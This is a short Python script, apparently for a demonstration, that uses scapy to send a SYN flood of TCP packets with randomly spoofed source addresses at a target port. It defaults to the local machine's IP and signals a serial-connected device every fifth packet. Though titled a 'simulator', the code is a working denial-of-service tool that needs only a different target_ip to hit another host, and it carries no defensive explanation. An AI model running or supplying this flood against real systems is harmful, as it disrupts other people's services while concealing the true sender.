from scapy.all import *
import random
import time
import socket
import serial

def generate_random_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def get_local_ip():
    """Automatically detect local IP"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def syn_flood(target_ip, target_port=80, packet_count=1000, delay=0.01, ser_port='COM9'):

    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Target Port: {target_port}")
    print(f"[*] Serial Port: {ser_port}")
    print(f"[*] Sending {packet_count} SYN packets...\n")

    # Connect to Serial for Demo Fail-Safe
    ser = None
    try:
        ser = serial.Serial(ser_port, 115200, timeout=0.1)
        print(f"[+] Serial Fail-Safe Enabled on {ser_port}")
    except:
        print("[!] Serial port not available. Sniffing only.")

    try:
        for i in range(packet_count):
            # 1. Send WiFi Packet
            ip_layer = IP(src=generate_random_ip(), dst=target_ip)
            tcp_layer = TCP(
                sport=RandShort(),
                dport=target_port,
                flags="S",
                seq=random.randint(1000,9000)
            )
            packet = ip_layer / tcp_layer
            send(packet, verbose=False)

            # 2. Send Serial Command (Injection)
            if ser and i % 5 == 0: # Inject every 5th packet to simulate sniffing
                ser.write(b"SYN\n")

            if (i+1) % 50 == 0:
                print(f"[+] Sent {i+1}/{packet_count}")

            time.sleep(delay)

        print("\n[*] Simulation Complete")

    except PermissionError:
        print("Run script as Administrator / sudo")
    finally:
        if ser: ser.close()

if __name__ == "__main__":
    target_ip = get_local_ip()

    print("================================")
    print(" SYN Flood Simulator (Auto IP)")
    print("================================")

    syn_flood(target_ip, packet_count=1000)